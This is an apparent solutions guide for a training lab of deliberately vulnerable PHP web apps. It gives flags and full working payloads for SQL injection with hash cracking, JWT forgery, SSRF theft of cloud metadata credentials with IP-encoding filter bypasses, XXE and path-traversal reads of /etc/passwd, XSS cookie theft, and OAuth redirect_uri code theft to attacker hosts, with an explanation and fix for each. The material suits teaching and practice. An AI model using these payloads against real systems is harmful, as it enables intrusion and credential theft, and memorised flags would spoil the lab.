# VulnNexus (app 2 — medium→hard) — Solutions
> ↑ Lab Kit · method: Web Penetration Test Checklist

`B=http://localhost:8001`. Seven challenges (six distinct flags — XXE reuses the path-traversal flag). Try each yourself first. (Track them on the 📊 Progress page.)

## 🏁 Flags — one per vuln
| Vuln | Flag | How |
|---|---|---|
| UNION SQLi | `FLAG{un10n_sql1_dumps_the_secrets_table}` | `UNION SELECT k,v,3 FROM secrets` |
| JWT forgery | `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}` | forge `role=admin` → `account.php` |
| SSRF | `FLAG{ssrf_reached_the_internal_metadata_service}` | `fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web01-stg-role` |
| Path traversal | `FLAG{tr4versed_out_of_the_docs_directory}` | `download.php?file=../private2/secret_config.txt` |
| XXE | `FLAG{tr4versed_out_of_the_docs_directory}` | external entity → `file:///…/webapp2/private2/secret_config.txt` (or read `/etc/passwd` to prove it) |
| Filtered XSS | `FLAG{xss_filter_byp4ss_c00kie}` | bypass the filter (`<img onerror>`) → steal the non-HttpOnly `flag` cookie via `document.cookie` |
| OAuth (redirect_uri) | `FLAG{oauth_redirect_uri_not_validated}` | `oauth_authorize.php?redirect_uri=<attacker>` → steal code → `oauth_callback.php?code=` |

## 1. UNION SQL injection  (`search.php?q=`)
**Answer:** `q` concatenated into a 3-column query → UNION-dump the `secrets` table.
**Command:**
```
curl -sG "$B/search.php" --data-urlencode "q=' UNION SELECT k,v,3 FROM secrets-- -"
# find columns first:  q=' ORDER BY 3-- -   (ok)   / ORDER BY 4-- - (error)
```
**Result:** `FLAG{un10n_sql1_dumps_the_secrets_table}` + `admin_pw`, plus encoded flags in the same table:
`flag_b64` (base64), `flag_sha256` (unsalted → `hashcat -m 1400` → `jordan23`), `flag_md5_salted`
(`hash:salt` → `hashcat -m 10` → `ginger`) — decode/crack each. **Reason:** `"...name LIKE '$q%'"`, 3 columns (name,category,price).
Deck: SQLi_Course_Labs · SQLi_Exploitation_Methodology.

**Bonus — dump + crack the `users` table** (realistic "SQLi → hash-ID → cracking → account takeover").
The table mixes **several hash algorithms** — this is a *hash-identification* drill. Dump the hashes **and
the salt column** (some rows are salted, some are not):
```
# enumerate first: information_schema.tables -> products, users, secrets
# the users columns include salt:  information_schema.columns -> ...,password,salt,role
' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,salt,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -
```
→ `username:hash:salt:role`. Now **identify each hash** (`hashid '<hash>'` or `hash-identifier`) and pick
the right mode — the lengths/prefixes give it away (32 hex = MD5, 40 = SHA-1, 64 = SHA-256, `$2y$` = bcrypt):

| user | hash | salt | algorithm | crack it with | plaintext |
|---|---|---|---|---|---|
| j.doe | `84d961…a576` (32 hex) | — | unsalted MD5 | `hashcat -m 0` / `john --format=raw-md5` | `superman` |
| a.smith | `e68e11…361e` (40 hex) | — | unsalted SHA-1 | `hashcat -m 100` / `john --format=raw-sha1` | `trustno1` |
| m.chen | `f145d6…d5d1` (64 hex) | `Tb82nR` | **salted** SHA-256 `sha256($pass.$salt)` | `hashcat -m 1410` (line `hash:salt`) | `ncc1701` |
| svc_api | `$2y$08$…` | (built-in) | **bcrypt** (cost 8) | `hashcat -m 3200` / `john --format=bcrypt` | `qwerty123` |
| admin | `99641c…79fb` (64 hex) | `kR9fQ2` | salted SHA-256 | `-m 1410` | **won't crack** (strong) |

```
# e.g. the salted SHA-256 (feed hash:salt) and the bcrypt:
printf '%s\n' 'f145d6227d344b596be8dd6624f81a099e5ccd4234d181a653c1fdfc0a13d5d1:Tb82nR' > sha256.txt
hashcat -m 1410 sha256.txt /usr/share/wordlists/rockyou.txt
printf '%s\n' '$2y$08$cguMochk7lKasJ6uKqA4dOQ8HnotyVZe7P0apRXlmfRdyP.9Vvbh.' > bc.txt
hashcat -m 3200 bc.txt /usr/share/wordlists/rockyou.txt      # slow by design — give it time
```
`admin`'s password is strong and won't fall even here — **but it equals `secrets.admin_pw`
(`Nexus!Adm1n#2026`)**, which the SQLi already leaked → takeover with no cracking at all. Lesson: **the
algorithm sets the cost** — legacy MD5/SHA-1 fall instantly, a salt forces one crack per hash, and
bcrypt's work factor is what actually buys time; none of it helps a weak or reused password.

## 2. JWT forgery  (`login.php` → `account.php`)
**Answer:** the verifier accepts **`alg:none`** *and* signs HS256 with a **weak secret** (`secret`). Either path forges `role=admin`.
**Command (alg:none — no signature needed):**
```
H=$(printf '{"alg":"none","typ":"JWT"}' | basenc --base64url | tr -d '=')
P=$(printf '{"user":"alice","role":"admin"}' | basenc --base64url | tr -d '=')
curl -s "$B/account.php" -H "Cookie: session=$H.$P."
```
**Command (weak secret — crack then sign):**
```
# get a real token from login, crack the HMAC secret:
hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt      # or: jwt_tool <tok> -C -d rockyou.txt  -> secret='secret'
# then forge with jwt_tool: jwt_tool <tok> -S hs256 -p 'secret' -T   (set role=admin)
```
**Result:** `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}`. **Reason:** `alg:none` branch returns the payload unverified; HS256 secret is guessable. Deck: JWT Attacks.

## 3. SSRF  (`fetch.php?url=`)
**Answer:** `fetch.php` is a server-side fetcher (a link/image-preview proxy) meant for **external** URLs.
With no allow-list you aim it at targets only the **server** can reach — the real **cloud instance-metadata
service** (AWS `169.254.169.254`, GCP `metadata.google.internal`, Azure) or local files via `file://`. The
crown jewel is the instance's **temporary IAM credentials** (AWS): walk `/latest/meta-data/` →
`iam/security-credentials/` → the role → the keys.
**Command:**
```
B=http://localhost:8001
# AWS IMDSv1 — walk the tree to the credentials (easy level, no filter):
curl -sG "$B/fetch.php" --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"              # -> role: web01-stg-role
curl -sG "$B/fetch.php" --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web01-stg-role" # -> AccessKeyId/SecretAccessKey/Token + flag
# file:// — SSRF becomes a local file read:
curl -sG "$B/fetch.php" --data-urlencode "url=file:///etc/passwd"
# GCP (needs the header) and Azure (needs Metadata: true):
curl -sG "$B/fetch.php" --data-urlencode "url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --data-urlencode "header=Metadata-Flavor:Google"
curl -sG "$B/fetch.php" --data-urlencode "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" --data-urlencode "header=Metadata:true"
# filter bypass per level (SAME metadata IP, different encoding — all resolve via inet_aton):
#   medium (literal IP blocked): decimal     http://2852039166/latest/meta-data/iam/security-credentials/web01-stg-role
#   hard   (+decimal/hex blocked): octal      http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/web01-stg-role
#   expert (+octal/file blocked): IPv6-mapped http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/web01-stg-role
```
**Result:** the IAM path returns the temporary-credentials JSON (`AccessKeyId`/`SecretAccessKey`/`Token`)
and `FLAG{ssrf_reached_the_internal_metadata_service}`; `file://` returns `/etc/passwd`; GCP/Azure return
their service-account / managed-identity tokens once the required header is set.
**Reason:** `file_get_contents()` with no scheme/host allow-list, plus host **normalization** (decimal, hex,
octal and IPv4-mapped IPv6 all resolve to `169.254.169.254`) which defeats naive string blacklists. In a
real cloud box those temp keys = account takeover. **Fix:** allow-list scheme (`https`) + destination host,
block link-local/private IPs *after* normalization, and require IMDSv2 (PUT session token).
Deck: SSRF_Guide · SSRF_Payload.

## 4. XXE  (`import.php`, POST XML)   *(needs the `php-xml` extension — see note below)*
**Answer:** the XML parser resolves external entities → read local files. The filter escalates per level,
but **every level stays a local file read** (self-contained — no out-of-band listener needed):
```
# easy — SYSTEM + file://
curl -s "$B/import.php?level=easy" -H "Content-Type: application/xml" --data-binary \
 '<?xml version="1.0"?><!DOCTYPE o [<!ENTITY e SYSTEM "file:///etc/passwd">]><order><item>&e;</item></order>'
# medium — 'SYSTEM' blocked -> PUBLIC
#   ...<!ENTITY e PUBLIC "x" "file:///etc/passwd">...
# hard — 'file:' blocked -> php://filter (base64), then base64-decode the output
#   ...<!ENTITY e PUBLIC "x" "php://filter/convert.base64-encode/resource=/etc/passwd">...
# expert — 'base64' blocked -> a DIFFERENT filter, then rot13 the output back
curl -s "$B/import.php?level=expert" -H "Content-Type: application/xml" --data-binary \
 '<?xml version="1.0"?><!DOCTYPE o [<!ENTITY e PUBLIC "x" "php://filter/read=string.rot13/resource=/etc/passwd">]><order><item>&e;</item></order>'
```
**Result:** the `item` echoes `/etc/passwd` (base64- or rot13-encoded at hard/expert — decode it back).
**Reason:** `DOMDocument::loadXML($xml, LIBXML_NOENT|LIBXML_DTDLOAD)` — external entities + DTD loading
enabled. Deck: XXE.

> **Dependency:** parsing needs PHP's `php-xml` (the `dom` extension). If it is missing, `import.php`
> says so (install `sudo apt install -y php-xml`, restart `run.sh`); `run.sh` also preflight-warns. Until
> then this one exercise can't run — every other app-2 vuln is unaffected.

## 5. Path traversal  (`download.php?file=`)
**Answer:** `file` is appended to `docs/` with no sanitisation → climb out.
Decode/crack reps: the target dir also has `secret_config.b64` (`base64 -d`) and `secret_config.sha1salt`
(`<sha1>:<salt>` → `hashcat -m 110` → `shadow`), reachable with the same `../` traversal.
**Command:**
```
curl -sG "$B/download.php" --data-urlencode "file=../private2/secret_config.txt"
curl -sG "$B/download.php" --data-urlencode "file=../../../../../../etc/passwd"
```
**Result:** `FLAG{tr4versed_out_of_the_docs_directory}` + an internal API token. **Reason:** `readfile(__DIR__."/docs/".$file)`. Deck: Path_Traversal.

## 6. Filtered reflected XSS  (`greet.php?name=`)
**Answer:** the filter only strips a literal `<script>` (case-insensitive, once) — trivially bypassed.
**Command (two bypasses):**
```
$B/greet.php?name=<img src=x onerror=alert(document.domain)>        # no <script> tag at all
$B/greet.php?name=<scr<script>ipt>alert(1)</scr</script>ipt>        # nested: inner <script> removed -> <script> remains
```
**Result:** the payload executes. **Reason:** blacklist filtering (`str_ireplace('<script>','')`) instead of output-encoding. Deck: XSS_02_Payloads · XSS_06_CSP_Bypass.

## 7. OAuth — unvalidated `redirect_uri` (auth-code theft)
**Answer:** the authorization endpoint sends the victim's auth code to **any** `redirect_uri` (no allow-list), so an attacker steals the code and logs in as the victim (`admin`).
**Command:**
```
# 1) the lure link makes the admin's code redirect to the ATTACKER's URL (your listener):
curl -s -D - "$B/oauth_authorize.php?redirect_uri=http://127.0.0.1:9002/&state=x" -o /dev/null | grep -i location
#    -> Location: http://127.0.0.1:9002/?code=<CODE>&state=x   (the code leaked to the attacker)
# 2) replay the stolen code at the callback:
curl -s "$B/oauth_callback.php?code=<CODE>"
```
**Result:** `FLAG{oauth_redirect_uri_not_validated}` — authenticated as admin. **Reason:** a real OAuth server must validate `redirect_uri` against the value registered for the `client_id`; here it's attacker-controlled → authorization-code theft → account takeover. Deck: Broken Authentication / JWT Attacks.

---
# 🧠 Why each bypass works — mechanism & examples

The sections above give the *payloads*. Here is **the vulnerable pattern, why it's exploitable, and why
each level's bypass defeats that level's defence.**

## 1. UNION SQL injection — read other tables through the search
**Mechanism.** `"...name LIKE '$q%'"` with **3 output columns**. A `UNION SELECT` appends your own rows
from any table, as long as the column **count matches** (and types are compatible).
```
' ORDER BY 3-- -        -> ok      (there are 3 columns)
' ORDER BY 4-- -        -> error   (so you know it's exactly 3)
' UNION SELECT k,v,3 FROM secrets-- -     -> your rows render alongside the products
```
*Why it works:* your input leaves the string literal and becomes SQL; `UNION` stitches a second result
set onto the first. The `users` table mixes several hash algorithms on purpose — a **hash-ID drill**
(32 hex = MD5, 40 = SHA-1, 64 = SHA-256, `$2y$` = bcrypt): dump `username:hash:salt`, identify, crack with
the matching mode. **Fix:** prepared statements + a least-privilege DB account.

## 2. JWT forgery — the server trusts the token it was handed
**Mechanism.** A JWT is `base64url(header).base64url(payload).signature`. The verifier here trusts the
token's *own* `alg` header, and the HMAC secret is weak — two independent forgeries:
```
alg:none     header {"alg":"none"}  payload {"role":"admin"}  signature EMPTY (keep the trailing dot)
             -> the 'none' branch returns the payload WITHOUT checking a signature → you pick the claims
weak secret  HS256 is symmetric (sign == verify key). The secret is 'secret' → crack it offline:
             hashcat -m 16500 token.jwt rockyou.txt   then re-sign role=admin with it
```
**Per level:** `alg:none` → crack `secret` → crack `superman` → **expert**: the secret is strong but is
itself stored in `secrets` → dump it with §1's SQLi, then sign (**a SQLi → JWT chain**).
*Why it works:* trusting the client-supplied `alg`, and using a guessable/leaked signing key, both let the
attacker mint a token the server accepts. **Fix:** pin the expected algorithm server-side, reject `none`,
use a strong random secret (or RS256 — verify with a public key the attacker can't sign with).

## 3. SSRF — the server fetches a URL you choose
**Mechanism.** `file_get_contents($url)` with **no scheme/host allow-list** → you aim the *server's*
network position at the cloud metadata service or local files. The crown jewel is the AWS IMDS chain:
```
/latest/meta-data/  →  iam/security-credentials/  →  web01-stg-role  →  AccessKeyId/SecretKey/Token
```
**Why the per-level encodings all work — host normalization (`inet_aton`).** The filter blacklists the
*string* `169.254.169.254`, but the fetcher (like a real resolver) accepts the IP written many ways and
normalizes them all back to the same address:
```
169.254.169.254   = 0xA9FEA9FE
medium  decimal      http://2852039166/…           (= 0xA9FEA9FE)         literal IP string blocked
hard    octal        http://0251.0376.0251.0376/…  (0251=169, 0376=254)   decimal + 0x hex blocked
expert  IPv6-mapped  http://[::ffff:a9fe:a9fe]/…   (a9fe:a9fe = the same) octal + file:// blocked
```
**GCP/Azure need a request header** (a real nuance): GCP returns **403** without `Metadata-Flavor: Google`;
Azure needs `Metadata: true` — a naive header-less SSRF fails there (the fetcher lets you add `&header=`).
**Fix:** allow-list scheme (`https`) + destination host, block link-local/private ranges **after**
normalization/DNS, and require IMDSv2 (a PUT session token, which a plain GET SSRF can't obtain).

## 4. XXE — the XML parser resolves external entities
**Mechanism.** `DOMDocument::loadXML($xml, LIBXML_NOENT|LIBXML_DTDLOAD)` enables DTD loading + entity
substitution, so a `SYSTEM` entity you define is **fetched and inlined** where you reference it:
```
<!DOCTYPE o [ <!ENTITY e SYSTEM "file:///etc/passwd"> ]>  …  <item>&e;</item>   → &e; becomes the file
```
**Per level** — each level bans the keyword/scheme the previous payload used:
```
easy    SYSTEM + file://
medium  PUBLIC "x" "file:///etc/passwd"                      'SYSTEM' blocked (PUBLIC also loads external)
hard    php://filter/convert.base64-encode/resource=/etc/passwd   'file:' blocked → wrapper, decode b64
expert  php://filter/read=string.rot13/resource=/etc/passwd       'base64' blocked → rot13 it back
```
*Why it works:* the parser is told to trust and expand external entities. **Fix:** disable DTDs/external
entities (don't set `NOENT|DTDLOAD`; `libxml_disable_entity_loader(true)` on old PHP) — a document never
needs to read the server's files.

## 5. Path traversal / source disclosure — a string becomes a file path
**Mechanism.** `readfile(__DIR__."/docs/".$file)` → `../` climbs out of `docs/`. For a **.php** file you
use `php://filter/convert.base64-encode/resource=…` because reading it normally would **execute** it —
the filter hands you its raw **source** (where DB creds live) to base64-decode.
*Finding `db.php`:* base64-read a file you KNOW exists (`resource=home.php`/`download.php`), decode, read
its `require/include` lines → they name the next files; or fuzz `db.php`/`config.php`.
**Fix:** allow-list filenames, `realpath()` + confirm the result stays under `docs/`, disable wrappers.

## 6. Filtered reflected XSS — a one-pass blacklist
**Mechanism.** `str_ireplace('<script>','', $name)` once, then echoed unencoded. Two ways past it:
```
<img src=x onerror=alert(document.cookie)>     there's no "<script>" substring at all → nothing to strip
<scr<script>ipt>alert(1)</scr</script>ipt>     removing the INNER "<script>" rejoins the outer halves
```
*Why it works:* a single-pass substring removal can't cover the many JS sinks, and nesting rebuilds the
tag after the pass. **Fix:** output-encode (`htmlspecialchars`), don't blacklist. (Then chain to cookie
theft as in app-1 §8 — the `flag` cookie is non-HttpOnly.)

## 7. OAuth — unvalidated `redirect_uri` (auth-code theft)
**Mechanism.** The authorization endpoint issues the signed-in victim's one-time **code** and redirects
the browser to the `redirect_uri` **without checking it against the client's registered callback**. Point
it at a host you control → you receive the victim's code → replay it → logged in as them.
```
registered (legit):  http://localhost:8001/oauth_callback.php
attacker's:          http://<attacker-host>/cb          ← /cb is just a PATH on the attacker's server
```
**What `/cb` is:** the path where the attacker's listener catches the incoming `?code=…`. It's arbitrary
(`/cb`, `/callback`, `/`, `/steal` all work) — only the **host** matters. The lab doesn't actually fetch
your URL; it prints the `Location:` it *would* send, so you see the code leave (`attacker.test`/`attacker`
are illustrative and don't resolve — the point is the server **accepted** an untrusted `redirect_uri`).

**Per level** — each adds a naive string check on the raw `redirect_uri` that you sidestep:
```
easy    http://attacker.test/cb                 no validation at all
medium  http://attacker.test/?x=localhost       must CONTAIN 'localhost' → put it in the QUERY
                                                   (host stays attacker.test; the check sees "localhost")
hard    http://localhost.attacker.test/cb       must START WITH http://localhost → SUBDOMAIN trick:
                                                   host = localhost.attacker.test (an attacker domain)
expert  http://localhost@attacker/cb            start-with + NO dots → @ USERINFO trick:
                                                   everything before @ is a username; real host = attacker
```
*Why hard works:* `localhost.attacker.test` literally starts with `http://localhost`, but the registrable
domain is `attacker.test`. *Why expert works:* in `scheme://user@host/path`, `localhost` is the
**userinfo** (a username) and the real **host is after `@`** (`attacker`), with no dots → both checks
fooled. Then replay the code:
```
oauth_callback.php?code=<CODE>        → FLAG{oauth_redirect_uri_not_validated} (authenticated as admin)
```
**Fix:** never prefix/substring-match the raw string. **Parse** the URL and compare the full redirect (or
at least the parsed **host**) against an exact allow-list — every payload above has a host that is *not*
your registered `localhost`, which strict parsing rejects.
